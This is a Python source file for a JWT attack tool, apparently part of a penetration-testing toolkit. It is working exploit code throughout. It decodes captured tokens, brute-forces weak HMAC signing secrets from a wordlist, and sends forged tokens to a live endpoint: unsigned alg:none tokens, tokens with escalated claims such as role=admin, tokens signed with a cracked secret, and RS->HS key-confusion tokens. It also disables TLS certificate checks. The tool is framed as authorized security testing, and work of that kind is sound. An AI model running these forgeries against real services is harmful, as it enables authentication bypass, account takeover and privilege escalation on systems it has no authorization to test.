#!/usr/bin/env python
"""jwt_probe.py — JWT attack-surface analyzer + offline crack + active forge (stdlib only).

Three layers (you opt into each; the analyzer is always safe/passive):

  ANALYZE (default)  decode a captured JWT (--token / --header / --file) and flag the
                     common attack CLASSES — alg:none susceptibility, RS->HS key-confusion
                     surface, kid/jku/jwk injection markers, expiry, sensitive claims.
                     Passive. A LEAD generator.

  CRACK   (--crack)  OFFLINE weak-secret crack of an HS256/384/512 token against a
                     wordlist (built-in common secrets + --wordlist file). No target
                     contact — pure crypto. A cracked secret = full forgery capability.

  ATTACK  (--attack-url <url>)  ACTIVE forge-and-send: replay a forged token against a
                     live endpoint and prove ACCEPTANCE. Tests alg:none accept, claim
                     escalation (e.g. role->admin), RS->HS key-confusion (--pubkey), and
                     (if --crack found the secret) a full cracked-secret forge with an
                     escalated claim. Each forged variant is paired with a WRONG-signature
                     control sent to the same endpoint, so acceptance is DECISIVE: a
                     forged token accepted where a wrong-sig control is rejected = the
                     server honors the forgery (CWE-347). This is exploitation (forging
                     credentials); operator-gated like sqlmap_run.

Usage:
  python jwt_probe.py --token <jwt>
  python jwt_probe.py --token <jwt> --crack [--wordlist rockyou.txt]
  python jwt_probe.py --token <jwt> --attack-url http://host/protected [--claim role=admin]
        [--pubkey pub.pem] [--header-name Authorization | --cookie 'sess={TOKEN}']
        [--insecure] [--timeout 10]
"""
import sys, os, json, base64, hmac, hashlib, ssl, re, time, argparse, urllib.request, urllib.error

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
_CTX = ssl.create_default_context(); _CTX.check_hostname = False; _CTX.verify_mode = ssl.CERT_NONE
JWT_RE = re.compile(r'\beyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*\b')

_HS = {"hs256": hashlib.sha256, "hs384": hashlib.sha384, "hs512": hashlib.sha512}

COMMON_SECRETS = [
    "secret", "password", "pass", "passw0rd", "123456", "12345678", "1234567890", "key",
    "jwt", "jwtsecret", "jwt-secret", "jwt_secret", "jwtsecretkey", "supersecret",
    "super-secret", "super_secret", "your-256-bit-secret", "your-secret-key", "secretkey",
    "secret-key", "secret_key", "changeme", "changeit", "admin", "administrator", "test",
    "testkey", "test-key", "default", "mysecret", "my-secret", "topsecret", "token",
    "auth", "azure", "azureadb2c", "example", "examplekey", "none", "key1", "abc123",
    "letmein", "qwerty", "secretpassword", "undefined", "null", "", "mfp",
]


def _b64dec(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64enc(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode(tok):
    parts = tok.split(".")
    if len(parts) < 2:
        return None, {"_decode_error": "not a 3-part JWT"}
    try:
        h = json.loads(_b64dec(parts[0])); p = json.loads(_b64dec(parts[1]))
        return h, p
    except Exception as e:
        return None, {"_decode_error": str(e)}


def analyze(tok):
    h, p = decode(tok)
    if h is None:
        return {"target": "jwt:(undecodable)", "ok": False, "error": "not a decodable JWT: " + p.get("_decode_error", ""), "findings": []}
    alg = (h.get("alg") or "").lower()
    findings = []
    if alg in ("none", ""):
        findings.append({"id": "jwt-alg-none", "severity": "high",
                         "detail": "alg is 'none'/empty — the signature may be skippable. Forge a token with alg:{none,} + empty sig and replay against the endpoint to confirm (CWE-347)"})
    kid = str(h.get("kid", ""))
    if alg.startswith("hs") and (h.get("jku") or h.get("jwk") or ("-----BEGIN" in kid) or kid.startswith(("http", "../")) or "'" in kid or '"' in kid):
        findings.append({"id": "jwt-kid-injection-surface", "severity": "high",
                         "detail": "HS alg with a suspicious kid/jku/jwk header — test kid path-traversal/SQLi/JWK-injection/jku trust (CWE-347)"})
    if alg.startswith(("rs", "es", "ps")):
        findings.append({"id": "jwt-rsa-key-confusion-surface", "severity": "medium",
                         "detail": "asymmetric alg — test whether the server accepts HS256 signed with the RSA PUBLIC key as the HMAC secret (the classic RS->HS confusion). Needs the JWKS/public key + the endpoint."})
    elif alg.startswith("hs"):
        findings.append({"id": "jwt-hs256-weak-secret-surface", "severity": "low",
                         "detail": "HS alg — test for a weak/low-entropy signing secret (offline crack via --crack or hashcat -m 16500); if cracked, full forgery"})
    exp = p.get("exp")
    if isinstance(exp, (int, float)):
        if exp < time.time():
            findings.append({"id": "jwt-expired", "severity": "info",
                             "detail": f"token exp is in the past (expired ~{int((time.time()-exp)/86400)}d ago)"})
        elif exp - time.time() < 3600:
            findings.append({"id": "jwt-imminent-expiry", "severity": "info",
                             "detail": f"token expires in <1h ({int(exp-time.time())}s)"})
    sensitive = {k: p[k] for k in p if k.lower() in ("role", "roles", "isadmin", "admin", "scope", "user", "userid", "email", "auth", "tenant")}
    if sensitive:
        findings.append({"id": "jwt-sensitive-claims", "severity": "info",
                         "detail": "token carries privilege-bearing claims — tampering these (with a cracked/none/confused key) is the priv-esc path", "claims": list(sensitive)})
    return {"target": "jwt:" + str(h.get("kid") or p.get("iss") or alg or "token"), "ok": True, "alg": alg or "(none)", "header": h, "claims": p, "exp_unix": exp,
            "sensitive_claims": sensitive, "findings": findings,
            "note": "ANALYZER only — confirming alg:none forgery / key confusion / claim-tamper needs --attack-url (forge+replay) or the verifier. A LEAD, not an exploit."}


# --- offline crack ------------------------------------------------------------

def crack(tok, wordlist_path=None):
    """Offline HS256/384/512 weak-secret crack. Returns {cracked, secret?, tried, alg}."""
    h, _ = decode(tok)
    alg = (h or {}).get("alg", "").lower() if h else ""
    parts = tok.split(".")
    if alg not in _HS:
        return {"cracked": False, "tried": 0, "alg": alg or "(n/a)",
                "note": "not an HS256/384/512 token — offline HMAC crack does not apply (asymmetric algs can't be cracked this way)"}
    try:
        target = _b64dec(parts[2])
    except Exception:
        return {"cracked": False, "tried": 0, "alg": alg, "note": "undecodable signature"}
    signing_input = (parts[0] + "." + parts[1]).encode()
    hasher = _HS[alg]
    words = list(COMMON_SECRETS)
    if wordlist_path:
        try:
            with open(wordlist_path, encoding="utf-8", errors="ignore") as f:
                words.extend(line.rstrip("\r\n") for line in f)
        except Exception as e:
            return {"cracked": False, "tried": 0, "alg": alg, "error": f"wordlist unreadable: {e}"}
    # de-dup while preserving order
    seen = set(); words = [w for w in words if not (w in seen or seen.add(w))]
    for i, w in enumerate(words, 1):
        if hmac.new(w.encode(), signing_input, hasher).digest() == target:
            return {"cracked": True, "secret": w, "tried": i, "alg": alg}
    return {"cracked": False, "tried": len(words), "alg": alg,
            "note": f"secret not in wordlist ({len(words)} tried) — does NOT prove strength; a larger list (rockyou/hashcat -m 16500) may still crack it"}


# --- active forge + send ------------------------------------------------------

def _sign_hs(header_obj, payload_obj, secret):
    signing_input = (_b64enc(json.dumps(header_obj, separators=(",", ":")).encode()) + "." +
                     _b64enc(json.dumps(payload_obj, separators=(",", ":")).encode())).encode()
    alg = header_obj["alg"].lower()
    key = secret.encode("utf-8") if isinstance(secret, str) else bytes(secret)
    sig = hmac.new(key, signing_input, _HS[alg]).digest()
    return signing_input.decode() + "." + _b64enc(sig)


def _forge_none(header_obj, payload_obj):
    return (_b64enc(json.dumps(header_obj, separators=(",", ":")).encode()) + "." +
            _b64enc(json.dumps(payload_obj, separators=(",", ":")).encode()) + ".")


def _send(url, token, header_name, cookie_tmpl, extra_headers, timeout, verify):
    h = {"User-Agent": UA, "Accept": "application/json,text/html;q=0.9,*/*;q=0.1"}
    if cookie_tmpl:
        h["Cookie"] = cookie_tmpl.replace("{TOKEN}", token)
    elif (header_name or "Authorization").lower() == "authorization":
        h["Authorization"] = "Bearer " + token
    else:
        h[header_name] = token
    h.update(extra_headers or {})
    req = urllib.request.Request(url, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=(_CTX if not verify else None)) as r:
            return r.status, r.read(4000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(4000).decode("utf-8", "replace")
    except Exception as e:
        return None, str(e)


def attack(tok, url, claims, header_name, cookie_tmpl, extra_headers, pubkey_path,
           cracked_secret, timeout, verify):
    """ACTIVE forge-and-send. Each forged variant paired with a WRONG-sig control."""
    h, p = decode(tok)
    if h is None:
        return {"ok": False, "error": "undecodable token"}
    alg = (h.get("alg") or "").lower()

    def esc(payload):
        pp = dict(payload)
        for k, v in claims:
            pp[k] = v
        return pp

    # WRONG-signature control: same shape, wrong key — a sane server MUST reject it.
    ctrl_header = {"alg": "HS256", "typ": "JWT"}
    control_tok = _sign_hs(ctrl_header, {"sub": "redan-control"}, "redan-wrong-key-9f7a")
    ctrl_status, ctrl_body = _send(url, control_tok, header_name, cookie_tmpl, extra_headers, timeout, verify)
    control_rejected = not (ctrl_status is not None and 200 <= ctrl_status < 300)

    variants = []  # (id, severity-if-confirmed, token, expect_marker?)
    # 1. alg:none accept (unsigned token)
    variants.append(("alg-none", "high", _forge_none({"alg": "none", "typ": "JWT"}, p), None))
    # 2. alg:none + claim escalation
    if claims:
        variants.append(("alg-none-escalation", "critical", _forge_none({"alg": "none", "typ": "JWT"}, esc(p)), claims))
    # 3. cracked-secret forge with escalation (full forge)
    if cracked_secret and claims:
        vh = {"alg": "HS256", "typ": "JWT"}
        variants.append(("cracked-forge-escalation", "critical", _sign_hs(vh, esc(p), cracked_secret), claims))
    elif cracked_secret:
        vh = {"alg": "HS256", "typ": "JWT"}
        variants.append(("cracked-forge", "high", _sign_hs(vh, p, cracked_secret), None))
    # 4. RS->HS key-confusion (sign HS256 with the RSA public key as the HMAC secret).
    #    A confused server verifies HS256 using the public key as the HMAC key; different
    #    implementations key on the PEM string, the base64 DER content, or the raw DER
    #    bytes, so try all three forms.
    if pubkey_path and alg.startswith(("rs", "ps")):
        try:
            with open(pubkey_path, "rb") as f:
                pem_str = f.read().decode("utf-8", "replace")
            forms = [("pem", pem_str)]
            b64der = re.sub(r"-----[^-+]+-----", "", pem_str).replace("\n", "").replace("\r", "").strip()
            if b64der:
                forms.append(("b64der", b64der))
                try:
                    forms.append(("der", base64.b64decode(b64der)))
                except Exception:
                    pass
            for tag, km in forms:
                try:
                    t = _sign_hs({"alg": "HS256", "typ": "JWT"}, esc(p) if claims else p, km)
                    variants.append(("key-confusion-" + tag, "critical" if claims else "high", t, claims or None))
                except Exception:
                    pass
        except Exception:
            variants.append(("key-confusion-error", "info", None, None))

    out = {"target": url, "ok": True, "alg": alg or "(none)", "control": {"status": ctrl_status, "rejected": control_rejected},
           "tests": [], "findings": []}
    findings = []
    if not control_rejected:
        findings.append({"id": "jwt-control-not-rejected", "severity": "info",
                         "detail": f"the WRONG-signature control token was NOT rejected (status {ctrl_status}) — the endpoint may not validate JWT signatures at all, or isn't token-gated; results below are inconclusive."})
    for vid, sev, vtok, marker in variants:
        if vtok is None:
            out["tests"].append({"id": vid, "skipped": True}); continue
        s, b = _send(url, vtok, header_name, cookie_tmpl, extra_headers, timeout, verify)
        accepted = s is not None and 200 <= s < 300
        # decisive only if control was rejected; otherwise note as ambiguous
        confirmed = accepted and control_rejected
        marker_honored = bool(marker and all(str(v).lower() in (b or "").lower() for v in [d[1] for d in (marker if isinstance(marker, list) else [marker])]))
        if isinstance(marker, list):
            marker_honored = all(str(v).lower() in (b or "").lower() for _, v in marker)
        entry = {"id": vid, "status": s, "accepted": accepted, "confirmed": confirmed,
                 "marker_honored": marker_honored if marker else None,
                 "body_snippet": (b or "")[:160].replace("\n", " ")}
        out["tests"].append(entry)
        if confirmed:
            if vid == "alg-none":
                findings.append({"id": "jwt-alg-none-accepted", "severity": "high",
                                 "detail": f"an alg:none (unsigned) token was ACCEPTED (status {s}) while a wrong-signature control was rejected ({ctrl_status}) — the server skips signature verification (CWE-347): forge any claims, full auth bypass."})
            elif vid.startswith("alg-none-escalation") and marker_honored:
                findings.append({"id": "jwt-none-escalation-honored", "severity": "critical",
                                 "detail": f"an unsigned alg:none token with an escalated claim ({dict(marker)}) was accepted AND the escalated value was reflected in the response — full privilege-escalation / ATO (CWE-347)."})
            elif vid.startswith("alg-none-escalation"):
                findings.append({"id": "jwt-none-escalation-accepted", "severity": "high",
                                 "detail": f"an unsigned alg:none token with an escalated claim was accepted (status {s}); confirm the server HONORS the tampered claim (reflected value) for the ATO path."})
            elif vid.startswith("cracked-forge-escalation") and marker_honored:
                findings.append({"id": "jwt-weak-secret-escalation", "severity": "critical",
                                 "detail": f"the HS secret was cracked AND a forged token with an escalated claim ({dict(marker)}) was accepted + reflected — full forgery + ATO via weak signing secret."})
            elif vid.startswith("cracked-forge"):
                findings.append({"id": "jwt-weak-secret-forge-accepted", "severity": "high",
                                 "detail": f"the HS secret was cracked AND a forged token was accepted (status {s}) — full forgery capability demonstrated end-to-end."})
            elif vid.startswith("key-confusion") and marker_honored:
                findings.append({"id": "jwt-key-confusion-escalation", "severity": "critical",
                                 "detail": f"an HS256 token signed with the RSA PUBLIC key (RS->HS confusion) + escalated claim was accepted + reflected — key-confusion ATO (CWE-347)."})
            elif vid.startswith("key-confusion"):
                findings.append({"id": "jwt-key-confusion", "severity": "high",
                                 "detail": f"an HS256 token signed with the RSA public key was accepted (status {s}) — RS->HS key confusion (CWE-347); forge with the public key."})
    out["findings"] = findings
    out["note"] = ("ACTIVE forge-and-send (exploitation). A forged token accepted WHERE a wrong-sig "
                   "control is rejected = the server honors the forgery (decisive). Operator-gated like "
                   "sqlmap_run; non-destructive (read only). Through a JS-challenge WAF the urllib channel "
                   "is blind — re-test via the browser.")
    return out


def extract(args):
    if args.token:
        return args.token
    if args.header:
        m = re.search(r"Bearer\s+(.+)", args.header, re.I)
        return m.group(1).strip() if m else args.header.strip()
    if args.file:
        try:
            txt = open(args.file, encoding="utf-8", errors="ignore").read()
            m = JWT_RE.search(txt)
            return m.group(0) if m else None
        except Exception:
            return None
    return None


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="JWT analyzer + offline crack + active forge")
    ap.add_argument("--token"); ap.add_argument("--header"); ap.add_argument("--file")
    ap.add_argument("--crack", nargs="?", const="__builtin__", default=None,
                    help="offline HS weak-secret crack (built-in list; pass a file path to extend)")
    ap.add_argument("--wordlist", help="extra wordlist file for --crack")
    ap.add_argument("--attack-url", help="ACTIVE forge+send against this token-gated URL")
    ap.add_argument("--claim", action="append", default=[], help="claim to escalate, k=v (repeatable)")
    ap.add_argument("--pubkey", help="RSA public key PEM (for RS->HS key-confusion test)")
    ap.add_argument("--header-name", default="Authorization", help="header carrying the token (default Authorization)")
    ap.add_argument("--cookie", help="cookie template with {TOKEN}, e.g. 'sess={TOKEN}'")
    ap.add_argument("--header-extra", action="append", default=[], help="extra request header, 'Name: value'")
    ap.add_argument("--timeout", type=int, default=10)
    ap.add_argument("--insecure", action="store_true")
    a = ap.parse_args()
    tok = extract(a)
    if not tok:
        print("usage: jwt_probe.py --token <jwt> [--crack [wordlist]] [--attack-url <url> --claim role=admin]"); sys.exit(2)

    out = analyze(tok)
    if a.crack is not None or a.wordlist:
        # --crack with a file path, OR --wordlist, both extend the built-in list
        path = a.wordlist or (a.crack if a.crack not in (None, "__builtin__") else None)
        out["crack"] = crack(tok, path)

    if a.attack_url:
        claims = []
        for c in a.claim:
            if "=" in c:
                k, v = c.split("=", 1); claims.append((k.strip(), v.strip()))
        cracked_secret = out.get("crack", {}).get("secret") if (out.get("crack") or {}).get("cracked") else None
        extra = {}
        for he in a.header_extra:
            if ":" in he:
                k, v = he.split(":", 1); extra[k.strip()] = v.strip()
        out["attack"] = attack(tok, a.attack_url, claims, a.header_name, a.cookie, extra,
                               a.pubkey, cracked_secret, a.timeout, not a.insecure)

    print(json.dumps(out, indent=2))
